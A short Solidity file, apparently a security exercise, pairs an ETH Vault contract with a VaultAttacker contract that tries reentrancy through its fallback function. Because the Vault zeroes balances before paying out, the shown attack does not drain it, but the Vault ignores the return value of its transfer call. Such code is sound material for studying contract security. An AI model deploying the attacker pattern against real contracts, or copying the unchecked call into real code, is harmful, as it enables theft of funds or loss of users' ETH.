// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.12;

// You can store ETH in this contract and redeem them.
contract Vault {
    mapping(address => uint256) public balances;

    /// @dev Store ETH in the contract.
    function store() public payable {
        balances[msg.sender] += msg.value;
    }

    /// @dev Redeem your ETH.
    function redeem() public {
        uint256 toSend = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.call{value: toSend}("");
    }
}

contract VaultAttacker {
    Vault vault;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.store{value: 1 ether}();
        vault.redeem();
    }

    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }
}
